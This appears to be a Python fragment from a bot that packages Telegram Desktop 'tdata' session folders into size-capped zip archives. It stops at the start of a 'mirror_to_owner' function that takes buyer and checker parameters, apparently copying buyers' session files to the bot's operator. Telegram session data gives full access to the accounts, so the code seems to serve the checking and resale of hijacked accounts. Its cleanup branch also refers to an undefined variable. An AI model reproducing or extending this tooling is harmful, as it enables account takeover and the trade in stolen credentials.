MIRROR_MAX_BYTES = 45 * 1024 * 1024

def _pack_tdata_parts(tdata_dir, part_cap):
    import shutil as _sh
    import tempfile as _tf
    import uuid as _uuid
    out = []
    try:
        sessions = sorted([p for p in Path(tdata_dir).iterdir() if p.is_dir()],
                          key=lambda p: p.name)
    except Exception:
        return out
    tmp_root = Path(_tf.gettempdir()) / f"krazii_tdatas_{_uuid.uuid4().hex[:8]}"
    try:
        if not sessions:
            try:
                has_files = any(p.is_file() for p in Path(tdata_dir).rglob("*"))
            except Exception:
                has_files = False
            if not has_files:
                return out
            try:
                tmp_root.mkdir(parents=True, exist_ok=True)
                _sh.make_archive(str(tmp_root / "Tdatas"), 'zip', tdata_dir)
                zp = tmp_root / "Tdatas.zip"
                if zp.exists() and zp.stat().st_size > 0:
                    out.append(("Tdatas.zip", zp, None))
                    return out
            except Exception as e:
                logger.warning(f"tdata single pack failed: {e}")
            _sh.rmtree(tmp_root, ignore_errors=True)
            return out
        groups, cur, cur_size = [], [], 0
        for s in sessions:
            try:
                sz = sum(f.stat().st_size for f in s.rglob("*") if f.is_file())
            except Exception:
                sz = 0
            if cur and cur_size + sz > part_cap:
                groups.append(cur)
                cur, cur_size = [], 0
            cur.append((s, sz))
            cur_size += sz
        if cur:
            groups.append(cur)
        for gi, grp in enumerate(groups, 1):
            grp_total = sum(sz for _, sz in grp)
            fname = f"Tdatas_part{gi}_of_{len(groups)}.zip" if len(groups) > 1 else "Tdatas.zip"
            if grp_total > part_cap and len(grp) == 1:
                out.append((grp[0][0].name, None, "too_big"))
                continue
            try:
                stage = tmp_root / f"part{gi}"
                stage.mkdir(parents=True, exist_ok=True)
                for sdir, _ in grp:
                    _sh.copytree(sdir, stage / sdir.name, dirs_exist_ok=True)
                _sh.make_archive(str(tmp_root / f"pack{gi}"), 'zip', stage)
                _sh.rmtree(stage, ignore_errors=True)
                zp = tmp_root / f"pack{gi}.zip"
                if zp.exists() and zp.stat().st_size > 0:
                    out.append((fname, zp, None))
            except Exception as e:
                logger.warning(f"tdata pack {gi} failed: {e}")
        if not out:
            _sh.rmtree(tmp_root, ignore_errors=True)
    except Exception as e:
        logger.warning(f"tdata pack failed: {e}")
        try:
            import shutil as _sh2
            _sh2.rmtree(_tr, ignore_errors=True)
        except Exception:
            pass
    return out

async def mirror_to_owner(context, buyer_id, buyer_username, checker_label, summary_html, files):
